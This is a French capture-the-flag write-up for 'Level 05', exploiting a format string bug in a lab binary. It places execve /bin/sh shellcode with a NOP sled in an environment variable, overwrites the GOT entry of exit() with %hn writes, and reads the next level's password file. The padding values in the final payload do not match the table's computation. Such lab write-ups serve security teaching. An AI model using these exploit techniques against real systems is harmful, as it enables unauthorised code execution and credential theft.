## Level 05

### Analyse

Le binaire lit 100 octets via `fgets` puis les affiche avec `printf(buffer)` au lieu de `printf("%s", buffer)` → **Format String Attack**.

**Contrainte — boucle de conversion**
Avant l'appel à `printf`, une boucle convertit tout octet entre `0x40` et `0x5a` en minuscule (`octet + 0x20`).
Conséquence : tout shellcode ou adresse placé dans le buffer sera potentiellement corrompu avant exécution.

on ecrit notre shellcode dans une variable d'environnement.
Les variables d'environnement sont stockées en dehors du buffer lu par `fgets`.
La boucle de conversion ne les touche jamais → le shellcode y est intact.
On écrit uniquement l'adresse de `MY_SHELL` via le format string, pas le shellcode lui-même.
Le NOP sled (`\x90` × 1000) absorbe un éventuel écart d'adresse.

**Cible — GOT de `exit()`**
Le programme appelle `exit()` juste après `printf`.
On écrase son entrée dans la GOT pour rediriger l'exécution vers `MY_SHELL`.

---

### Étape 1 — Placer le shellcode en mémoire

```bash
export MY_SHELL=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

---

### Étape 2 — Trouver l'adresse de MY_SHELL

```bash
gdb ./level05
break main
run
p (char *) getenv("MY_SHELL")
# → 0xffffd8e0  (adresse du NOP sled)
```

---

### Étape 3 — Trouver l'adresse GOT de exit()

```bash
objdump -R ./level05 | grep exit
# → 0x080497e0  exit
```

---

### Étape 4 — Trouver l'offset dans la stack

```bash
echo "AAAA %p %p %p %p %p %p %p %p %p %p" | ./level05
# Repérer où 0x41414141 apparaît → offset 10
```

---

### Calcul du payload %hn

On écrit l'adresse de `MY_SHELL` en deux fois (2 octets par 2 octets) avec `%hn`.

```
MY_SHELL        = 0xffffd8e0
octet bas (hn)  = 0xd8e0 = 55520
octet haut (hn) = 0xffff = 65535

Adresse GOT     = 0x080497e0  →  écriture à 0x080497e0 et 0x080497e2
```

| Écriture | Adresse GOT    | Valeur à écrire | Caractères à afficher |
|----------|----------------|-----------------|-----------------------|
| `%hn` 1  | `0x080497e0`   | `0xd8e0 = 55520`| `55520 - 8 = 55512`   |
| `%hn` 2  | `0x080497e2`   | `0xffff = 65535`| `65535 - 55520 = 10015`|

---

### Exploitation

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56022x" + "%10$08hn" + "%9505x" + "%11$08hn"' ; cat -) | ./level05


$ whoami
level06
$ cat /home/users/level06/.pass
```